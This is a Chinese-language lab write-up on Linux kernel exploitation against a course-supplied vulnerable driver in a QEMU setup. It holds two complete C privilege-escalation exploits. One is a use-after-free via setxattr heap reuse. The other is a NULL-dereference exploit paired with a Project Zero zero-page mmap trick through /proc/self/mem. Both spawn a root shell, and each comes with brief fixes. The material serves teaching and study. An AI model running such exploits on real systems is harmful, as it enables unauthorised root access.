---
layout: post
title: "破防实践5 kernel pwn利用"
date:   2022-5-18
tags: [kernel_pwn]
comments: true
author: wsxk
---

破防实践5来喽，为什么破防实践4不写呢，因为太水了，也没啥有趣的东西。

破防实践5是新设计的实验，使用的是3年前的kernel漏洞，已经泪目了，终于有一回实验用的是5年内的东西了。

- [实验环境搭建](#实验环境搭建)
  - [基本环境：](#基本环境)
  - [环境搭建过程](#环境搭建过程)
  - [启动脚本](#启动脚本)
  - [交互](#交互)
- [实验源码审计](#实验源码审计)
- [说在前面，kernel pwn的目的](#说在前面kernel-pwn的目的)
- [大前提 commit\_creds、prepare\_kernel\_cred地址](#大前提-commit_credsprepare_kernel_cred地址)
- [漏洞利用](#漏洞利用)
  - [uaf漏洞利用](#uaf漏洞利用)
    - [exp](#exp)
    - [阻止措施](#阻止措施)
  - [空指针引用(Null Pointer Dereference)、零地址空间漏洞](#空指针引用null-pointer-dereference零地址空间漏洞)
    - [exp](#exp-1)
    - [阻止措施](#阻止措施-1)
- [启示](#启示)


<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-C22S5YSYL7');
</script>


## 实验环境搭建

### 基本环境：

ubuntu20.04

gcc8

### 环境搭建过程

    apt-get update
    apt-get install qemu qemu-kvm
    
    apt-get install build-essential flex bison bc libelf-dev libssl-dev libncurses5-dev gcc-8

    wget https://github.com/torvalds/linux/archive/v5.0-rc1.tar.gz

    tar -xvf v5.0-rc1.tar.gz
    cd linux-v5.0-rc1
    make x86_64_defconfig
    make CC=gcc-8

这是基本操作，如果在make期间的报错一般都是因为你漏装了什么东西，补上就可以了

生成结束后，如果成功了，会在/arch/x86/boot/发现bzImage文件

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-5-18-%E7%A0%B4%E9%98%B2%E5%AE%9E%E8%B7%B55_kernel_pwn/1.png)

### 启动脚本

创建一个启动脚本用于便捷启动 内核

    qemu-system-x86_64 \
    -kernel ./linux-5.0-rc1/arch/x86/boot/bzImage \  # krnel生成的bzImage相对于你脚本创建位置的路径。
    -append "console=ttyS0 root=/dev/sda debug earlyprintk=serial
    slub_debug=QUZ pti=off oops=panic ftrace_dump_on_oops nokaslr" \
    -hda wheezi.img \
    -net user,hostfwd=tcp::10021-:22 -net nic \
    -nographic -m 512M -smp 2 \
    -pidfile vm.pid 2>&1 | tee vm.log

保存脚本

    chmod +x script.sh
    ./script.sh

这时候你的内核就会启动

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-5-18-%E7%A0%B4%E9%98%B2%E5%AE%9E%E8%B7%B55_kernel_pwn/2.png)

### 交互

[交互程序](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-5-18-%E7%A0%B4%E9%98%B2%E5%AE%9E%E8%B7%B55_kernel_pwn/connectvm)

在终端运行该程序即可。

## 实验源码审计

本次实验主要是利用kernel中的堆漏洞

老师已经给出了源码

[源码](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-5-18-%E7%A0%B4%E9%98%B2%E5%AE%9E%E8%B7%B55_kernel_pwn/drill_mod)

这是一个linux普通的驱动程序（实验中内核已经自动注册了这个驱动程序）

做过pwn的小伙伴看到这个应该很熟悉

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-5-18-%E7%A0%B4%E9%98%B2%E5%AE%9E%E8%B7%B55_kernel_pwn/3.png)

在剥去它驱动的高贵身份后，它就是个普通的菜单堆题（

其中

case DRILL_ACT_ALLOC 就是申请一个堆chunk

case DRILL_ACT_CALLBACK就是引用这个堆里面的内容的

case DRILL_ACT_FREE 就是释放这个chunk的

case DRILL_ACT_RESET 是把chunk中的一个位置的置0，（在case DRILL_ACT_CALLBACK 中会调用原本这个位置的函数）

## 说在前面，kernel pwn的目的

kernel pwn和user pwn最大的不同在于，user pwn的目的是为了get shell（不管权限是什么），和kernel pwn的目的是为了 获得root shell，换句话说你可以想干啥就干啥。

一般地来说，如果你在现实环境中攻击一台主机，你首先也是通过 user pwn 拿到shell，在利用kernel pwn提权，获得root权限。

能提到权主要是利用了

    commit_creds(prepare_kernel_cred(NULL))

prepare_kernel_cred函数在参数为NULL（0）的时候，会准备root权限的结构体。

通过commit_creds函数提交，会更换原本程序的creds结构体而获得权限提升（root）

因此 kernel pwn的最终目的就是利用漏洞最终运行 

    commit_creds(prepare_kernel_cred(NULL))

函数从而获得root权限。

## 大前提 commit_creds、prepare_kernel_cred地址

这个实验找到commit_creds、prepare_kernel_cred函数地址是通过system.map文件搜寻到的（编译好内核后可以在内核相关文件夹里搜寻该名称）

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-5-18-%E7%A0%B4%E9%98%B2%E5%AE%9E%E8%B7%B55_kernel_pwn/5.png)

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-5-18-%E7%A0%B4%E9%98%B2%E5%AE%9E%E8%B7%B55_kernel_pwn/6.png)

从而得知了两个关键函数的地址。

## 漏洞利用

### uaf漏洞利用

uaf的漏洞的原理也不用多说了。

这道题就单看这个机制，是没有uaf漏洞可以利用的

但是内核机制千千万，总有一个适合你~~~~

内核中有一个叫做 setxattr 的函数

setxattr() 用于根据参数来设置或替换某个扩展属性的值，或者创建一个新的扩展属性

它的流程如下图所示

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-5-18-%E7%A0%B4%E9%98%B2%E5%AE%9E%E8%B7%B55_kernel_pwn/4.png)

我们不关注它到底是来干嘛用的，我们关注的是 它用到了 strncpy_from_user()函数，而这个函数会从用户空间复制内容到内核态空间中。

这就给了我们可趁之机，我们可以先申请一个kernel chunk，然后释放掉它（其指针并没有置空），通常这个chunk并没有归还给系统，而是自己保留，如果之后再申请了这个chunk，可以直接把该chunk给申请者来使用，这么做的目的是减少了I/O请求，提高效率。

通过setxattr()函数（申请一个和驱动大小一致的chunk），然后往callback的位置写入一个 引用了commit_creds(prepare_kernel_cred(NULL))的函数地址，然后调用callback从而提权。


#### exp

    #define _GNU_SOURCE

    #include <stdio.h>
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <fcntl.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <string.h>
    #include <sys/syscall.h>
    #include <stdbool.h>
    #include <sys/wait.h>
    #include <sys/mman.h>
    #include <stdint.h>
    #include <sys/xattr.h>

    #define MMAP_SZ			0x2000
    #define PAYLOAD_SZ		3300	// MDL: copy DRILL_ITEM_SIZE from kernel module

    /* ============================== Kernel stuff ============================== */

    /* Addresses from System.map (no KASLR) */
    #define COMMIT_CREDS_PTR	0xffffffff81084370lu	// MDL: fix this symbol
    #define PREPARE_KERNEL_CRED_PTR	0xffffffff810845a0lu	// MDL: fix this symbol

    typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
    typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

    _commit_creds commit_creds = (_commit_creds)COMMIT_CREDS_PTR;
    _prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED_PTR;

    void __attribute__((regparm(3))) root_it(unsigned long arg1, bool arg2)
    {
        commit_creds(prepare_kernel_cred(0));
    }

    // MDL: copy the definition of drill_item_t here
    struct drill_item_t {
        u32 foo;
        void (*callback)(void);
        char bar[1];
    };
    /* ========================================================================== */

    void run_sh(void)
    {
        pid_t pid = -1;
        char *args[] = {
            "/bin/sh",
            "-i",
            NULL
        };
        int status = 0;

        pid = fork();

        if (pid < 0) {
            perror("[-] fork()");
            return;
        }

        if (pid == 0) {
            execve("/bin/sh", args, NULL); /* Should not return */
            perror("[-] execve");
            exit(EXIT_FAILURE);
        }

        if (wait(&status) < 0)
            perror("[-] wait");
    }

    void init_payload(char *p, size_t size)
    {
        struct drill_item_t *item = (struct drill_item_t *)p;

        memset(p, 0x41, size);

        item->callback = (uint64_t)root_it;

        printf("[+] payload:\n");
        printf("\tstart at %p\n", p);
        printf("\tcallback %lx\n", item->callback);
    }

    int act(int fd, char code)
    {
        ssize_t bytes = 0;

        bytes = write(fd, &code, 1);
        if (bytes <= 0) {
            perror("[-] write");
            return EXIT_FAILURE;
        }

        return EXIT_SUCCESS;
    }

    int main(void)
    {
        unsigned char *spray_data = NULL;
        int ret = EXIT_FAILURE;
        int fd = -1;

        printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());

        spray_data = mmap(NULL, MMAP_SZ, PROT_READ | PROT_WRITE,
                        MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        if (spray_data == MAP_FAILED) {
            perror("[-] mmap failed");
            goto end;
        }

        init_payload(spray_data, MMAP_SZ);
        fd=open("/sys/kernel/debug/drill/drill_act", O_WRONLY);
        act(fd,49);
        act(fd,50);
        act(fd,51);
        // MDL: echo '1' > /sys/kernel/debug/drill/drill_act
        // MDL: echo '2' > /sys/kernel/debug/drill/drill_act
        // MDL: echo '3' > /sys/kernel/debug/drill/drill_act
        
        // MDL: why do we call setxattr with such spray_data and PAYLOAD_SZ?
        ret = setxattr("./", "foobar", spray_data, PAYLOAD_SZ, 0);
        printf("setxattr returned %d\n", ret);

        // MDL: echo '2' > /sys/kernel/debug/drill/drill_act
        act(fd,50);

        if (getuid() == 0 && geteuid() == 0) {
            printf("[+] finish as: uid=0, euid=0, start sh...\n");
            run_sh();
            ret = EXIT_SUCCESS;
        } else {
            printf("[-] need heap spraying\n");
        }

        printf("[+] The End\n");

    end:
        if (fd >= 0) {
            ret = close(fd);
            if (ret != 0)
                perror("[-] close fd");
        }

        return ret;
    }

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-5-18-%E7%A0%B4%E9%98%B2%E5%AE%9E%E8%B7%B55_kernel_pwn/7.png)

#### 阻止措施

我们只需要在释放该chunk后，将其指针指空就行。


### 空指针引用(Null Pointer Dereference)、零地址空间漏洞

当数据指针或代码指针是 NULL 时，使用其进行内存访问的时候， 就会触发空指针引用，导致程序崩溃。这种漏洞在用户态一般被认为只能进行 拒绝服务攻击，无法进行高阶漏洞利用。但是在内核中则不然.

具体原因是，其实空指针（0）内核是有资格创建chunk并访问的！！！

因为0地址本来就在内核的操控区内！！！

上面提到的驱动程序中，可以先申请一个chunk，然后将其callback置0，这样就能得到一个0指针。

如果什么都不做直接引用它，就会引起内核崩溃，操作系统直接卡死（这时候你需要重新来过）

因为内核虽然理论上能为访问0地址空间，但是如果你没有在该地址上创建一块内存区域，你访问它还是会炸。

这时候就引入了另一个漏洞

零地址空间漏洞

[https://bugs.chromium.org/p/project-zero/issues/detail?id=1792](https://bugs.chromium.org/p/project-zero/issues/detail?id=1792)


这个漏洞可以在0地址上mmap出一块内存区域。

这样你空指针引用就有了意义，它就不会导致crash了。

#### exp

    #define _GNU_SOURCE

    #include <stdio.h>
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <fcntl.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <string.h>
    #include <sys/syscall.h>
    #include <stdbool.h>
    #include <sys/wait.h>
    #include <stdint.h>
    #include <sys/mman.h>

    /* ============================== Kernel stuff ============================== */

    /* Addresses from System.map (no KASLR) */
    #define COMMIT_CREDS_PTR	0xffffffff81084370lu		// MDL: fix this symbol
    #define PREPARE_KERNEL_CRED_PTR	0xffffffff810845a0lu	// MDL: fix this symbol

    typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
    typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

    _commit_creds commit_creds = (_commit_creds)COMMIT_CREDS_PTR;
    _prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED_PTR;

    void __attribute__((regparm(3))) root_it(unsigned long arg1, bool arg2)
    {
        commit_creds(prepare_kernel_cred(0));
    }

    struct drill_item_t {
        uint32_t foo;
        uint64_t callback;
        char bar[1];
    };

    /* ========================================================================== */

    void run_sh(void)
    {
        pid_t pid = -1;
        char *args[] = {
            "/bin/sh",
            "-i",
            NULL
        };
        int status = 0;

        pid = fork();

        if (pid < 0) {
            perror("[-] fork()");
            return;
        }

        if (pid == 0) {
            execve("/bin/sh", args, NULL); /* Should not return */
            perror("[-] execve");
            exit(EXIT_FAILURE);
        }

        if (wait(&status) < 0)
            perror("[-] wait");
    }

    void init_payload(void *p)
    {
        struct drill_item_t *item = (struct drill_item_t *)p;

        item->callback = (uint64_t)root_it;

        printf("[+] payload:\n");
        printf("\tstart at %p\n", p);
        printf("\tcallback %lx\n", item->callback);
    }

    int act(int fd, char code)
    {
        ssize_t bytes = 0;

        bytes = write(fd, &code, 1);
        if (bytes <= 0) {
            perror("[-] write");
            return EXIT_FAILURE;
        }

        return EXIT_SUCCESS;
    }

    int main(void)
    {
        int ret = EXIT_FAILURE;
        void *map = NULL;
        int mem_fd = -1;
        char cmd[1000];
        unsigned long addr = 0;
        int drill_fd = -1;

        printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());

        // MDL: copy the reproducer from the blog below to map zero address
        // MDL: https://bugs.chromium.org/p/project-zero/issues/detail?id=1792&desc=2
        map = mmap((void*)0x10000, 0x1000, PROT_READ | PROT_WRITE,
            MAP_PRIVATE | MAP_ANONYMOUS | MAP_GROWSDOWN | MAP_FIXED, -1, 0);
        if (map == MAP_FAILED) {
            perror("[-] mmap");
            goto end;
        }
        mem_fd = open("/proc/self/mem", O_RDWR);
        if (mem_fd < 0) {
            perror("[-] open /proc/self/mem");
            goto end;
        }

        addr = (unsigned long)map;
        sprintf(cmd, "LD_DEBUG=help su 1>&%d", mem_fd);
        while (addr != 0) {
            addr -= 0x1000;

            if (lseek(mem_fd, addr, SEEK_SET) == -1) {
                perror("[-] lseek in /proc/self/mem");
                goto end;
            }

            system(cmd);
        }
        printf("[+] /proc/$PPID/maps:\n");
        system("head -n1 /proc/$PPID/maps");

        drill_fd = open("/sys/kernel/debug/drill/drill_act", O_WRONLY);
        // MDL: echo '1' > /sys/kernel/debug/drill/drill_act
        // MDL: echo '4' > /sys/kernel/debug/drill/drill_act
        act(drill_fd,49);
        act(drill_fd,52);
        init_payload((void *)NULL);

        // MDL: echo '2' > /sys/kernel/debug/drill/drill_act
        act(drill_fd,50);

        if (getuid() == 0 && geteuid() == 0) {
            printf("[+] finish as: uid=0, euid=0, start sh...\n");
            run_sh();
            ret = EXIT_SUCCESS;
        } else {
            printf("[-] didn't get root\n");
            goto end;
        }

        printf("[+] The End\n");

    end:
        if (drill_fd >= 0) {
            ret = close(drill_fd);
            if (ret != 0)
                perror("[-] close drill_fd");
        }

        if (mem_fd >= 0) {
            ret = close(mem_fd);
            if (ret != 0)
                perror("[-] close mem_fd");
        }

        return ret;
    }

#### 阻止措施

在使用一个指针前，判断它是否为空，如果为空，就不用。


## 启示

这两个实验给我们的启示还是很多的。

第一个启示是 在考虑kernel 漏洞提权时，不一定要盯死一个机制，kernel作为最复杂的系统，它提供了无数的机制给我们使用。我们完全可以通过机制的组合来达到提权目的

第二个启示是 一个漏洞有时候没有什么影响，但是配合另一个漏洞会产生巨大威力。

